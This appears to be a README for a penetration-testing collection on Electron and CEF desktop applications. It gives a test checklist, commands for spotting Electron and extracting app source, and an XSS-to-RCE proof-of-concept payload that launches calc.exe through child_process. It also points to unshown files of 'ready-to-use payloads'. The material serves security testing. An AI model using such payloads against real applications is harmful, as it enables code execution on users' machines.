# Electron / CEF Application Attacks

Attack techniques specific to Electron and Chromium Embedded Framework desktop applications.

**Severity**: CRITICAL when `nodeIntegration: true` (XSS = full RCE)

## Files

| File | Description |
|------|-------------|
| [`electron_attacks.md`](electron_attacks.md) | Complete guide — identification, source extraction, security config audit, XSS→RCE payloads, preload script analysis, protocol handler injection, DevTools access, auto-update hijacking, full test checklist |
| [`electron_rce_payloads.js`](electron_rce_payloads.js) | Ready-to-use payloads — XSS→RCE (nodeIntegration), preload abuse, protocol handler attacks, IPC injection, asar backdoor, DevTools commands, security audit script |

## Identify Electron/CEF
```powershell
# Check for Electron markers
Test-Path "C:\path\to\app\resources\electron.asar"
Get-ChildItem "C:\path\to\app" -Filter "libcef.dll"   # CEF
```

## Critical Configuration Flags

```javascript
// DANGEROUS (any XSS = RCE)
nodeIntegration: true
contextIsolation: false

// If you find these, any reflected/stored XSS in the app gives:
require('child_process').exec('calc.exe')
```

## Test Priority

1. **Extract source** — `npx asar extract resources/app.asar ./extracted`
2. **Check config** — `nodeIntegration`, `contextIsolation`, `sandbox`
3. **Find XSS** — Any input field, URL parameter, protocol handler
4. **Test XSS→RCE** — `<img src=x onerror="require('child_process').exec('calc.exe')">`
5. **Check preload** — Look for overly permissive `contextBridge.exposeInMainWorld` APIs
6. **Protocol handlers** — Test custom URL schemes for injection
7. **Auto-update** — Check if update channel is HTTP or validates signatures
